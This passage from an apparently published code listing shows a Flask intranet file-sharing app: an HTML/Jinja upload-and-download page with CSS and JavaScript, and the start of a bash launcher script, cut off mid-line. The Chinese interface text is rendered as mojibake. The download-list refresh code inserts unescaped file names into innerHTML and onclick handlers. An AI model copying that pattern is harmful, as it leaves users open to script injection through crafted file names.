linear-gradient(90deg, #4b6cb7 0%, #182848 100%); color: white; padding: 25px 40px; text-align: center; } header h1 { font-size: 2.2em; margin-bottom: 10px; } .server-info { display: flex; justify-content: center; gap: 30px; margin-top: 15px; font-size: 0.9em; opacity: 0.9; } .content { display: flex; min-height: 600px; } .panel { flex: 1; padding: 30px; border-right: 1px solid #eaeaea; } .panel:last-child { border-right: none; } .panel h2 { color: #333; margin-bottom: 25px; padding-bottom: 15px; border-bottom: 2px solid #4b6cb7; font-size: 1.5em; } .upload-area { border: 3px dashed #4b6cb7; border-radius: 10px; padding: 40px 20px; text-align: center; background: #f8f9ff; margin-bottom: 30px; transition: all 0.3s; cursor: pointer; } .upload-area:hover { background: #eef2ff; border-color: #667eea; } .upload-area.drag-over { background: #e0e7ff; border-color: #764ba2; transform: scale(1.02); } .upload-icon { font-size: 48px; color: #4b6cb7; margin-bottom: 15px; } .file-list { margin-top: 20px; } .file-item { display: flex; justify-content: space-between; align-items: center; padding: 12px 15px; background: #f8f9fa; margin-bottom: 10px; border-radius: 8px; transition: all 0.2s; } .file-item:hover { background: #e9ecef; transform: translateX(5px); } .file-info { flex: 1; min-width: 0; } .file-name { font-weight: bold; color: #333; margin-bottom: 5px; word-break: break-all; } .file-meta { font-size: 0.85em; color: #666; display: flex; gap: 15px; } .file-actions { display: flex; gap: 10px; } .btn { padding: 8px 16px; border: none; border-radius: 6px; cursor: pointer; font-weight: 500; transition: all 0.2s; text-decoration: none; display: inline-block; text-align: center; } .btn-download { background: #28a745; color: white; } .btn-download:hover { background: #218838; } .btn-delete { background: #dc3545; color: white; } .btn-delete:hover { background: #c82333; } .btn-refresh { background: #17a2b8; color: white; margin-bottom: 15px; } .btn-refresh:hover { background: #138496; } .stats { display: flex; justify-content: space-between; margin-top: 20px; padding-top: 15px; border-top: 1px solid #eee; color: #666; font-size: 0.9em; } .empty-message { text-align: center; color: #999; padding: 40px 20px; font-style: italic; } .upload-progress { margin-top: 20px; display: none; } .progress-bar { width: 100%; height: 20px; background: #e9ecef; border-radius: 10px; overflow: hidden; margin-top: 10px; } .progress-fill { height: 100%; background: linear-gradient(90deg, #4b6cb7 0%, #667eea 100%); width: 0%; transition: width 0.3s; } @media (max-width: 1024px) { .content { flex-direction: column; } .panel { border-right: none; border-bottom: 1px solid #eaeaea; } } .notification { position: fixed; top: 20px; right: 20px; padding: 15px 25px; border-radius: 8px; color: white; font-weight: 500; z-index: 1000; opacity: 0; transform: translateX(100%); transition: all 0.3s; } .notification.show { opacity: 1; transform: translateX(0); } .notification.success { background: #28a745; } .notification.error { background: #dc3545; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;header\u0026gt; \u0026lt;h1\u0026gt;ğŸ“ å†…ç½‘æ–‡ä»¶å…±äº«ç³»ç»Ÿ\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;æ‹–æ‹½æ–‡ä»¶åˆ°å·¦ä¾§ä¸Šä¼ ï¼Œå³ä¾§æ–‡ä»¶å¯ç›´æ¥ä¸‹è½½\u0026lt;/p\u0026gt; \u0026lt;div class=\u0026#34;server-info\u0026#34;\u0026gt; \u0026lt;div\u0026gt;ä¸Šä¼ ç›®å½•ï¼š{{ upload_folder }}\u0026lt;/div\u0026gt; \u0026lt;div\u0026gt;ä¸‹è½½ç›®å½•ï¼š{{ download_folder }}\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/header\u0026gt; \u0026lt;div class=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;!-- å·¦ä¾§ä¸Šä¼ é¢æ¿ --\u0026gt; \u0026lt;div class=\u0026#34;panel\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;â¬†ï¸ æ–‡ä»¶ä¸Šä¼ åŒº\u0026lt;/h2\u0026gt; \u0026lt;div class=\u0026#34;upload-area\u0026#34; id=\u0026#34;uploadArea\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;upload-icon\u0026#34;\u0026gt;ğŸ“\u0026lt;/div\u0026gt; \u0026lt;h3\u0026gt;æ‹–æ”¾æ–‡ä»¶åˆ°æ­¤å¤„\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;æˆ–ç‚¹å‡»é€‰æ‹©æ–‡ä»¶\u0026lt;/p\u0026gt; \u0026lt;p style=\u0026#34;color: #666; margin-top: 10px; font-size: 0.9em;\u0026#34;\u0026gt; æ”¯æŒæ ¼å¼ï¼štxt, pdf, png, jpg, zip, doc, mp4 ç­‰ \u0026lt;/p\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; id=\u0026#34;fileInput\u0026#34; multiple style=\u0026#34;display: none;\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;upload-progress\u0026#34; id=\u0026#34;uploadProgress\u0026#34;\u0026gt; \u0026lt;div\u0026gt;æ­£åœ¨ä¸Šä¼ ï¼š\u0026lt;span id=\u0026#34;currentFile\u0026#34;\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;progress-bar\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;progress-fill\u0026#34; id=\u0026#34;progressFill\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div id=\u0026#34;progressText\u0026#34;\u0026gt;0%\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;h3\u0026gt;å·²ä¸Šä¼ æ–‡ä»¶\u0026lt;/h3\u0026gt; \u0026lt;button class=\u0026#34;btn btn-refresh\u0026#34; onclick=\u0026#34;refreshUploadList()\u0026#34;\u0026gt; ğŸ”„ åˆ·æ–°åˆ—è¡¨ \u0026lt;/button\u0026gt; \u0026lt;div class=\u0026#34;file-list\u0026#34; id=\u0026#34;uploadFileList\u0026#34;\u0026gt; {% if upload_files %} {% for file in upload_files %} \u0026lt;div class=\u0026#34;file-item\u0026#34; data-filename=\u0026#34;{{ file.name }}\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;file-info\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;file-name\u0026#34;\u0026gt;{{ file.name }}\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;file-meta\u0026#34;\u0026gt; \u0026lt;span\u0026gt;å¤§å°ï¼š{{ (file.size / 1024 / 1024)|round(2) if file.size \u0026gt; 1024*1024 else (file.size / 1024)|round(2) }} {{ \u0026#39;MB\u0026#39; if file.size \u0026gt; 1024*1024 else \u0026#39;KB\u0026#39; }}\u0026lt;/span\u0026gt; \u0026lt;span\u0026gt;ä¿®æ”¹ï¼š{{ file.modified }}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;file-actions\u0026#34;\u0026gt; \u0026lt;button class=\u0026#34;btn btn-delete\u0026#34; onclick=\u0026#34;deleteFile(\u0026#39;{{ file.name }}\u0026#39;, \u0026#39;upload\u0026#39;)\u0026#34;\u0026gt; ğŸ—‘ï¸ åˆ é™¤ \u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; {% endfor %} {% else %} \u0026lt;div class=\u0026#34;empty-message\u0026#34;\u0026gt;æš‚æ— ä¸Šä¼ æ–‡ä»¶\u0026lt;/div\u0026gt; {% endif %} \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;stats\u0026#34;\u0026gt; \u0026lt;div\u0026gt;æ–‡ä»¶æ€»æ•°ï¼š{{ upload_files|length }}\u0026lt;/div\u0026gt; \u0026lt;div\u0026gt;æ€»å¤§å°ï¼š{{ upload_files|sum(attribute=\u0026#39;size\u0026#39;) / 1024 / 1024|round(2) }} MB\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- å³ä¾§ä¸‹è½½é¢æ¿ --\u0026gt; \u0026lt;div class=\u0026#34;panel\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;â¬‡ï¸ æ–‡ä»¶ä¸‹è½½åŒº\u0026lt;/h2\u0026gt; \u0026lt;button class=\u0026#34;btn btn-refresh\u0026#34; onclick=\u0026#34;refreshDownloadList()\u0026#34;\u0026gt; ğŸ”„ åˆ·æ–°åˆ—è¡¨ \u0026lt;/button\u0026gt; \u0026lt;div class=\u0026#34;file-list\u0026#34; id=\u0026#34;downloadFileList\u0026#34;\u0026gt; {% if download_files %} {% for file in download_files %} \u0026lt;!-- ä¿®æ”¹æ–‡ä»¶é¡¹æ˜¾ç¤ºéƒ¨åˆ† --\u0026gt; \u0026lt;div class=\u0026#34;file-item\u0026#34; data-filename=\u0026#34;{{ file.name }}\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;file-info\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;file-name\u0026#34;\u0026gt; {{ file.name }} {% if not file.safe %} \u0026lt;span style=\u0026#34;color: #dc3545; font-size: 0.8em; margin-left: 5px;\u0026#34;\u0026gt; âš ï¸ å±é™©æ–‡ä»¶ \u0026lt;/span\u0026gt; {% endif %} \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;file-meta\u0026#34;\u0026gt; \u0026lt;span\u0026gt;å¤§å°ï¼š{{ get_readable_size(file.size) }}\u0026lt;/span\u0026gt; \u0026lt;span\u0026gt;ä¿®æ”¹ï¼š{{ file.modified }}\u0026lt;/span\u0026gt; {% if file.type %} \u0026lt;span\u0026gt;ç±»å‹ï¼š{{ file.type }}\u0026lt;/span\u0026gt; {% endif %} \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;file-actions\u0026#34;\u0026gt; {% if file.type and (file.type.startswith(\u0026#39;image/\u0026#39;) or file.type.startswith(\u0026#39;text/\u0026#39;) or file.type == \u0026#39;application/pdf\u0026#39;) %} \u0026lt;a href=\u0026#34;/preview/{{ file.name }}\u0026#34; class=\u0026#34;btn btn-preview\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt; ğŸ‘ï¸ é¢„è§ˆ \u0026lt;/a\u0026gt; {% endif %} \u0026lt;a href=\u0026#34;/download/{{ file.name }}\u0026#34; class=\u0026#34;btn btn-download\u0026#34;\u0026gt; ğŸ“¥ ä¸‹è½½ \u0026lt;/a\u0026gt; \u0026lt;button class=\u0026#34;btn btn-delete\u0026#34; onclick=\u0026#34;deleteFile(\u0026#39;{{ file.name }}\u0026#39;, \u0026#39;download\u0026#39;)\u0026#34;\u0026gt; ğŸ—‘ï¸ åˆ é™¤ \u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; {% endfor %} {% else %} \u0026lt;div class=\u0026#34;empty-message\u0026#34;\u0026gt; \u0026lt;p\u0026gt;ä¸‹è½½ç›®å½•ä¸ºç©º\u0026lt;/p\u0026gt; \u0026lt;p style=\u0026#34;margin-top: 10px; font-size: 0.9em;\u0026#34;\u0026gt; å°†æ–‡ä»¶æ”¾å…¥ \u0026lt;code\u0026gt;{{ download_folder }}\u0026lt;/code\u0026gt; ç›®å½•å³å¯åœ¨æ­¤æ˜¾ç¤º \u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; {% endif %} \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;stats\u0026#34;\u0026gt; \u0026lt;div\u0026gt;æ–‡ä»¶æ€»æ•°ï¼š{{ download_files|length }}\u0026lt;/div\u0026gt; \u0026lt;div\u0026gt;æ€»å¤§å°ï¼š{{ download_files|sum(attribute=\u0026#39;size\u0026#39;) / 1024 / 1024|round(2) }} MB\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;notification\u0026#34; id=\u0026#34;notification\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; // æ˜¾ç¤ºé€šçŸ¥ function showNotification(message, type = \u0026#39;success\u0026#39;) { const notification = document.getElementById(\u0026#39;notification\u0026#39;); notification.textContent = message; notification.className = `notification ${type}`; notification.classList.add(\u0026#39;show\u0026#39;); setTimeout(() =\u0026gt; { notification.classList.remove(\u0026#39;show\u0026#39;); }, 3000); } // åˆ·æ–°ä¸Šä¼ åˆ—è¡¨ async function refreshUploadList() { try { const response = await fetch(\u0026#39;/\u0026#39;); const text = await response.text(); const parser = new DOMParser(); const doc = parser.parseFromString(text, \u0026#39;text/html\u0026#39;); const uploadList = doc.getElementById(\u0026#39;uploadFileList\u0026#39;); document.getElementById(\u0026#39;uploadFileList\u0026#39;).innerHTML = uploadList.innerHTML; showNotification(\u0026#39;ä¸Šä¼ åˆ—è¡¨å·²åˆ·æ–°\u0026#39;, \u0026#39;success\u0026#39;); } catch (error) { showNotification(\u0026#39;åˆ·æ–°å¤±è´¥: \u0026#39; + error, \u0026#39;error\u0026#39;); } } // åˆ·æ–°ä¸‹è½½åˆ—è¡¨ async function refreshDownloadList() { try { const response = await fetch(\u0026#39;/get_file_list\u0026#39;); const data = await response.json(); const downloadList = document.getElementById(\u0026#39;downloadFileList\u0026#39;); if (data.files.length === 0) { downloadList.innerHTML = ` \u0026lt;div class=\u0026#34;empty-message\u0026#34;\u0026gt; \u0026lt;p\u0026gt;ä¸‹è½½ç›®å½•ä¸ºç©º\u0026lt;/p\u0026gt; \u0026lt;p style=\u0026#34;margin-top: 10px; font-size: 0.9em;\u0026#34;\u0026gt; å°†æ–‡ä»¶æ”¾å…¥ä¸‹è½½ç›®å½•å³å¯åœ¨æ­¤æ˜¾ç¤º \u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; `; return; } let html = \u0026#39;\u0026#39;; data.files.forEach(file =\u0026gt; { const size = file.size \u0026gt; 1024*1024 ? (file.size / 1024 / 1024).toFixed(2) + \u0026#39; MB\u0026#39; : (file.size / 1024).toFixed(2) + \u0026#39; KB\u0026#39;; html += ` \u0026lt;div class=\u0026#34;file-item\u0026#34; data-filename=\u0026#34;${file.name}\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;file-info\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;file-name\u0026#34;\u0026gt;${file.name}\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;file-meta\u0026#34;\u0026gt; \u0026lt;span\u0026gt;å¤§å°ï¼š${size}\u0026lt;/span\u0026gt; \u0026lt;span\u0026gt;ä¿®æ”¹ï¼š${file.modified}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;file-actions\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;/download/${file.name}\u0026#34; class=\u0026#34;btn btn-download\u0026#34;\u0026gt; ğŸ“¥ ä¸‹è½½ \u0026lt;/a\u0026gt; \u0026lt;button class=\u0026#34;btn btn-delete\u0026#34; onclick=\u0026#34;deleteFile(\u0026#39;${file.name}\u0026#39;, \u0026#39;download\u0026#39;)\u0026#34;\u0026gt; ğŸ—‘ï¸ åˆ é™¤ \u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; `; }); downloadList.innerHTML = html; showNotification(\u0026#39;ä¸‹è½½åˆ—è¡¨å·²åˆ·æ–°\u0026#39;, \u0026#39;success\u0026#39;); } catch (error) { showNotification(\u0026#39;åˆ·æ–°å¤±è´¥: \u0026#39; + error, \u0026#39;error\u0026#39;); } } // åˆ é™¤æ–‡ä»¶ async function deleteFile(filename, type) { if (!confirm(`ç¡®å®šè¦åˆ é™¤ ${filename} å—ï¼Ÿ`)) { return; } try { const endpoint = type === \u0026#39;upload\u0026#39; ? `/delete_upload/${encodeURIComponent(filename)}` : `/delete_download/${encodeURIComponent(filename)}`; const response = await fetch(endpoint, { method: \u0026#39;DELETE\u0026#39; }); const data = await response.json(); if (data.success) { showNotification(\u0026#39;æ–‡ä»¶åˆ é™¤æˆåŠŸ\u0026#39;, \u0026#39;success\u0026#39;); if (type === \u0026#39;upload\u0026#39;) { refreshUploadList(); } else { refreshDownloadList(); } } else { showNotification(\u0026#39;åˆ é™¤å¤±è´¥: \u0026#39; + data.error, \u0026#39;error\u0026#39;); } } catch (error) { showNotification(\u0026#39;åˆ é™¤å¤±è´¥: \u0026#39; + error, \u0026#39;error\u0026#39;); } } // æ–‡ä»¶ä¸Šä¼ å¤„ç† const uploadArea = document.getElementById(\u0026#39;uploadArea\u0026#39;); const fileInput = document.getElementById(\u0026#39;fileInput\u0026#39;); const uploadProgress = document.getElementById(\u0026#39;uploadProgress\u0026#39;); const currentFile = document.getElementById(\u0026#39;currentFile\u0026#39;); const progressFill = document.getElementById(\u0026#39;progressFill\u0026#39;); const progressText = document.getElementById(\u0026#39;progressText\u0026#39;); // ç‚¹å‡»ä¸Šä¼ åŒºåŸŸé€‰æ‹©æ–‡ä»¶ uploadArea.addEventListener(\u0026#39;click\u0026#39;, () =\u0026gt; { fileInput.click(); }); // æ–‡ä»¶é€‰æ‹©å˜åŒ– fileInput.addEventListener(\u0026#39;change\u0026#39;, (e) =\u0026gt; { handleFiles(e.target.files); }); // æ‹–æ”¾ä¸Šä¼  [\u0026#39;dragenter\u0026#39;, \u0026#39;dragover\u0026#39;, \u0026#39;dragleave\u0026#39;, \u0026#39;drop\u0026#39;].forEach(eventName =\u0026gt; { uploadArea.addEventListener(eventName, preventDefaults, false); }); function preventDefaults(e) { e.preventDefault(); e.stopPropagation(); } [\u0026#39;dragenter\u0026#39;, \u0026#39;dragover\u0026#39;].forEach(eventName =\u0026gt; { uploadArea.addEventListener(eventName, highlight, false); }); [\u0026#39;dragleave\u0026#39;, \u0026#39;drop\u0026#39;].forEach(eventName =\u0026gt; { uploadArea.addEventListener(eventName, unhighlight, false); }); function highlight() { uploadArea.classList.add(\u0026#39;drag-over\u0026#39;); } function unhighlight() { uploadArea.classList.remove(\u0026#39;drag-over\u0026#39;); } // å¤„ç†æ–‡ä»¶æ”¾ç½® uploadArea.addEventListener(\u0026#39;drop\u0026#39;, (e) =\u0026gt; { const dt = e.dataTransfer; const files = dt.files; handleFiles(files); }); // å¤„ç†æ–‡ä»¶ä¸Šä¼  async function handleFiles(files) { if (files.length === 0) return; for (let i = 0; i \u0026lt; files.length; i++) { const file = files[i]; // æ˜¾ç¤ºä¸Šä¼ è¿›åº¦ uploadProgress.style.display = \u0026#39;block\u0026#39;; currentFile.textContent = file.name; progressFill.style.width = \u0026#39;0%\u0026#39;; progressText.textContent = \u0026#39;0%\u0026#39;; const formData = new FormData(); formData.append(\u0026#39;file\u0026#39;, file); try { const response = await fetch(\u0026#39;/upload\u0026#39;, { method: \u0026#39;POST\u0026#39;, body: formData }); const data = await response.json(); if (data.success) { progressFill.style.width = \u0026#39;100%\u0026#39;; progressText.textContent = \u0026#39;100%\u0026#39;; showNotification(`${file.name} ä¸Šä¼ æˆåŠŸ`, \u0026#39;success\u0026#39;); // åˆ·æ–°ä¸Šä¼ åˆ—è¡¨ setTimeout(refreshUploadList, 500); } else { showNotification(`${file.name} ä¸Šä¼ å¤±è´¥: ${data.error}`, \u0026#39;error\u0026#39;); } } catch (error) { showNotification(`${file.name} ä¸Šä¼ å¤±è´¥: ${error}`, \u0026#39;error\u0026#39;); } } // éšè—ä¸Šä¼ è¿›åº¦æ¡ setTimeout(() =\u0026gt; { uploadProgress.style.display = \u0026#39;none\u0026#39;; }, 2000); // æ¸…é™¤æ–‡ä»¶è¾“å…¥ fileInput.value = \u0026#39;\u0026#39;; } \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; start.sh 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 310 311 312 313 314 315 316 317 318 319 320 321 322 323 324 325 326 327 328 329 330 331 332 333 #!/bin/bash # æ–‡ä»¶å…±äº«ç³»ç»Ÿä¸€é”®å¯åŠ¨è„šæœ¬ # ä½¿ç”¨æ–¹æ³•: ./start.sh set -e # å‡ºé”™æ—¶åœæ­¢æ‰§è¡Œ echo \u0026#34;========================================\u0026#34; echo \u0026#34; å†…ç½‘æ–‡ä»¶å…±äº«ç³»ç»Ÿ - å¯åŠ¨è„šæœ¬\u0026#34; echo \u0026#34;========================================\u0026#34; # å®šä¹‰é¢œè‰²è¾“å‡º RED=\u0026#39;\\033[0;31m\u0026#39; GREEN=\u0026#39;\\033[0;32m\u0026#39; YELLOW=\u0026#39;\\033[1;33m\u0026#39; BLUE=\u0026#39;\\033[0;34m\u0026#39; NC=\u0026#39;\\033[0m\u0026#39; # No Color # è¾“å‡ºå¸¦é¢œè‰²çš„æ¶ˆæ¯ info() { echo -e \u0026#34;${BLUE}[INFO]${NC} $1\u0026#34; } success() { echo -e \u0026#34;${GREEN}[SUCCESS]${NC} $1\u0026#34; } warning() { echo -e \u0026#34;${YELLOW}[WARNING]${NC} $1\u0026#34; } error() { echo -e \u0026#34;${RED}[ERROR]${NC} $1\u0026#34; } # æ£€æŸ¥æ˜¯å¦ä»¥rootè¿è¡Œ if [ \u0026#34;$EUID\u0026#34; -eq 0 ]; then warning \u0026#34;æ£€æµ‹åˆ°ä»¥rootç”¨æˆ·è¿è¡Œï¼Œå»ºè®®ä½¿ç”¨æ™®é€šç”¨æˆ·\u0026#34; read -p \u0026#34;æ˜¯å¦ç»§ç»­? (y/N): \u0026#34; -n 1 -r echo if [[ ! $REPLY =~ ^[Yy]$ ]]; then echo \u0026#34;å·²å–æ¶ˆ\u0026#34; exit 1 fi fi # è·å–è„šæœ¬æ‰€åœ¨ç›®å½• SCRIPT_DIR=\u0026#34;$( cd \u0026#34;$( dirname \u0026#34;${BASH_SOURCE[0]}\u0026#34; )\u0026#34; \u0026amp;\u0026gt; /dev/null \u0026amp;\u0026amp; pwd )\u0026#34; cd \u0026#34;$SCRIPT_DIR\u0026#34; info \u0026#34;å½“å‰ç›®å½•: $(pwd)\u0026#34; # æ£€æŸ¥å¿…è¦çš„æ–‡ä»¶ if [ ! -f \u0026#34;app.py\u0026#34; ]; then error \u0026#34;æ‰¾ä¸åˆ° app.py æ–‡ä»¶\u0026#34; exit 1 fi if [ ! -d \u0026#34;templates\u0026#34; ]; then error \u0026#34;æ‰¾ä¸åˆ° templates ç›®å½•\u0026#34; exit 1 fi # åˆ›å»ºå¿…è¦çš„ç›®å½• mkdir -p uploads downloads logs # æ£€æŸ¥Pythonç¯å¢ƒ info \u0026#34;æ£€æŸ¥Pythonç¯å¢ƒ...\u0026#34; if ! command -v python3 \u0026amp;\u0026gt; /dev/null; then error \u0026#34;æœªæ‰¾åˆ° python3ï¼Œè¯·å…ˆå®‰è£…Python\u0026#34; exit 1 fi PYTHON_VERSION=$(python3 --version | cut -d\u0026#39; \u0026#39; -f2) info \u0026#34;Pythonç‰ˆæœ¬: $PYTHON_VERSION\u0026#34; # æ£€æŸ¥Flaskæ˜¯å¦å·²å®‰è£… info \u0026#34;æ£€æŸ¥Flaskå®‰è£…...\u0026#34; if ! python3 -c \u0026#34;import flask\u0026#34; 2\u0026gt;/dev/null; then error \u0026#34;Flaskæœªå®‰è£…ï¼Œè¯·å…ˆå®‰è£…Flask: pip install flask\u0026#34; exit 1 fi FLASK_VERSION=$(python3 -c \u0026#34;import flask; print(flask.__version__)\u0026#34; 2\u0026gt;/dev/null || echo \u0026#34;æœªçŸ¥\u0026#34;) info \u0026#34;Flaskç‰ˆæœ¬: $FLASK_VERSION\u0026#34; # æ£€æŸ¥é˜²ç«å¢™ï¼ˆç«¯å£æ”¹ä¸º10000ï¼‰- ç®€åŒ–æ£€æŸ¥ info \u0026#34;æ£€æŸ¥é˜²ç«å¢™è®¾ç½®...\u0026#34; if command -v ufw \u0026amp;\u0026gt; /dev/null; then UFW_STATUS=$(sudo ufw status 2\u0026gt;/dev/null || echo \u0026#34;inactive\u0026#34;) if echo \u0026#34;$UFW_STATUS\u0026#34; | grep -q \u0026#34;active\u0026#34;; then warning \u0026#34;æ£€æµ‹åˆ°UFWé˜²ç«å¢™å·²å¯ç”¨\u0026#34; info \u0026#34;æ£€æŸ¥10000ç«¯å£...\u0026#34; if echo \u0026#34;$UFW_STATUS\u0026#34; | grep -q \u0026#34;10000/tcp\u0026#34;; then success \u0026#34;10000ç«¯å£å·²å¼€æ”¾\u0026#34; else warning \u0026#34;10000ç«¯å£æœªå¼€æ”¾\u0026#34; read -p \u0026#34;æ˜¯å¦å¼€æ”¾10000ç«¯å£? (y/N): \u0026#34; -n 1 -r echo if [[ $REPLY =~ ^[Yy]$ ]]; then sudo ufw allow 10000/tcp sudo ufw reload success \u0026#34;10000ç«¯å£å·²å¼€æ”¾\u0026#34; else warning \u0026#34;å¦‚æœæ— æ³•è®¿é—®ï¼Œè¯·æ‰‹åŠ¨å¼€æ”¾ç«¯å£: sudo ufw allow 10000/tcp\u0026#34; fi fi fi fi # è·å–æœ¬æœºIP info \u0026#34;è·å–æœ¬æœºIPåœ°å€...\u0026#34; IP_ADDRESSES=\u0026#34;\u0026#34; # å°è¯•å¤šç§æ–¹æ³•è·å–IP if command -v ip \u0026amp;\u0026gt; /dev/null; then # ä½¿ç”¨ipå‘½ä»¤ IP_ADDRESSES=$(ip -o -4 addr show 2\u0026gt;/dev/null | awk \u0026#39;{print $4}\u0026#39; | cut -d/ -f1 | grep -v \u0026#39;127.0.0.1\u0026#39; | head -5) elif command -v ifconfig \u0026amp;\u0026gt; /dev/null; then # ä½¿ç”¨ifconfigå‘½ä»¤ IP_ADDRESSES=$(ifconfig 2\u0026gt;/dev/null | grep -Eo \u0026#39;inet (addr:)?([0-9]*\\.){3}[0-9]*\u0026#39; | grep -v \u0026#39;127.0.0.1\u0026#39; | cut -d\u0026#39; \u0026#39; -f2 | head -5) else # æœ€åå°è¯•ä½¿ç”¨hostname IP_ADDRESSES=$(hostname -I 2\u0026gt;/dev/null | tr \u0026#39; \u0026#39; \u0026#39;\\n\u0026#39; | grep -v \u0026#39;^$\u0026#39; | head -5 || echo \u0026#34;\u0026#34;) fi if [ -z \u0026#34;$IP_ADDRESSES\u0026#34; ]; then IP_ADDRESSES=\u0026#34;æ— æ³•è·å–IP\u0026#34; warning \u0026#34;æ— æ³•è·å–æœ¬æœºIPåœ°å€ï¼Œåªèƒ½é€šè¿‡127.0.0.1è®¿é—®\u0026#34; else info \u0026#34;æ‰¾åˆ°IPåœ°å€:\u0026#34; for ip in $IP_ADDRESSES; do echo \u0026#34; - $ip\u0026#34; done fi # æ£€æŸ¥æ˜¯å¦å·²åœ¨è¿è¡Œ info \u0026#34;æ£€æŸ¥æœåŠ¡å™¨çŠ¶æ€...\u0026#34; PID_FILE=\u0026#34;server.pid\u0026#34; LOG_FILE=\u0026#34;logs/server.log\u0026#34; ERROR_FILE=\u0026#34;logs/error.log\u0026#34; if [ -f \u0026#34;$PID_FILE\u0026#34; ]; then PID=$(cat \u0026#34;$PID_FILE\u0026#34;) if ps -p \u0026#34;$PID\u0026#34; \u0026gt; /dev/null 2\u0026gt;\u0026amp;1; then warning \u0026#34;æœåŠ¡å™¨å·²åœ¨è¿è¡Œ (PID: $PID)\u0026#34; read -p \u0026#34;æ˜¯å¦é‡å¯æœåŠ¡å™¨? (y/N): \u0026#34; -n 1 -r echo if [[ $REPLY =~ ^[Yy]$ ]]; then info \u0026#34;åœæ­¢ç°æœ‰æœåŠ¡å™¨...\u0026#34; kill \u0026#34;$PID\u0026#34; 2\u0026gt;/dev/null || true sleep 2 if ps -p \u0026#34;$PID\u0026#34; \u0026gt; /dev/null 2\u0026gt;\u0026amp;1; then warning \u0026#34;æ­£å¸¸åœæ­¢å¤±è´¥ï¼Œå¼ºåˆ¶åœæ­¢...\u0026#34; kill -9 \u0026#34;$PID\u0026#34; 2\u0026gt;/dev/null || true sleep 1 fi rm -f \u0026#34;$PID_FILE\u0026#34; success \u0026#34;æœåŠ¡å™¨å·²åœæ­¢\u0026#34; else info \u0026#34;æœåŠ¡å™¨çŠ¶æ€:\u0026#34; echo \u0026#34; PID: $PID\u0026#34; echo \u0026#34; æ—¥å¿—æ–‡ä»¶: $LOG_FILE\u0026#34; echo \u0026#34; è®¿é—®åœ°å€: http://127.0.0.1:10000\u0026#34; for ip in $IP_ADDRESSES; do if [ \u0026#34;$ip\u0026#34; != \u0026#34;æ— æ³•è·å–IP\u0026#34; ]; then echo \u0026#34; http://$ip:10000\u0026#34; fi done echo \u0026#34;\u0026#34; echo \u0026#34;æŸ¥çœ‹æ—¥å¿—: tail -f 